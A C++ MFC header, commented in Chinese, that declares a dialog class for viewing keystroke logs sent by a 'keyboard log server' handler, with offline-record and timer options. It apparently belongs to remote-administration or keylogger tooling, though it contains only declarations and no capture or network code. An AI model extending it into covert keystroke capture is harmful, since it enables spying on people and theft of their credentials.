#pragma once
#include "afxwin.h"
#include "resource.h"

#define WM_KEYBD_LOG_DATA		(WM_USER + 123)
#define WM_KEYBD_LOG_ERROR		(WM_USER + 124)
#define WM_KEYBD_LOG_INIT		(WM_USER + 125)

// CKeybdLogDlg 对话框
class CKeybdLogSrv;

class CKeybdLogDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CKeybdLogDlg)

public:
	CKeybdLogDlg(CKeybdLogSrv*pHandler,CWnd* pParent = NULL);   // 标准构造函数
	virtual ~CKeybdLogDlg();

// 对话框数据
	enum { IDD = IDD_KBD_LOG };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	CKeybdLogSrv*	m_pHandler;
	DWORD			m_dwTimerId;

	DECLARE_MESSAGE_MAP()
public:
	afx_msg LRESULT OnLogData(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnError(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnLogInit(WPARAM wParam, LPARAM lParam);
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	CEdit m_Log;
	DWORD m_Interval;
	CButton m_OfflineRecord;
	afx_msg void OnBnClickedOk2();
	afx_msg void OnBnClickedOk();
	virtual void OnCancel();
	afx_msg void OnEnChangeEdit2();
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnBnClickedCheck1();
	afx_msg void OnBnClickedButton1();
};
